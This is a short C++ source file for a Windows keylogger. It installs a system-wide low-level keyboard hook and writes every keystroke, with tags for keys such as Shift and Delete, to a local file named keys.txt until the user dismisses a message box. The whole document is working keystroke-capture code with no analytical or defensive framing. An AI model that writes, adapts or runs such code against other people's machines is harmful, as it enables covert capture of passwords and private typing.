#define _WIN32_WINNT 0x0500

#include<fstream>
#include<windows.h>

using namespace std;

ofstream out("keys.txt", ios::out);

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);

    // If key is being pressed
    if (wParam == WM_KEYDOWN) {
        switch (p->vkCode) {

            // Invisible keys
            case VK_CAPITAL:    out << "<CAPLOCK>";     break;
            case VK_SHIFT:      out << "<SHIFT>";       break;
            case VK_LCONTROL:   out << "<LCTRL>";       break;
            case VK_RCONTROL:   out << "<RCTRL>";       break;
            case VK_INSERT:     out << "<INSERT>";      break;
            case VK_END:        out << "<END>";         break;
            case VK_PRINT:      out << "<PRINT>";       break;
            case VK_DELETE:     out << "<DEL>";         break;
            case VK_BACK:       out << "<BK>";          break;

            case VK_LEFT:       out << "<LEFT>";        break;
            case VK_RIGHT:      out << "<RIGHT>";       break;
            case VK_UP:         out << "<UP>";          break;
            case VK_DOWN:       out << "<DOWN>";        break;

            // Visible keys
            default:
                out << char(tolower(p->vkCode));

        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

    MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);

    out.close();

    return 0;
}
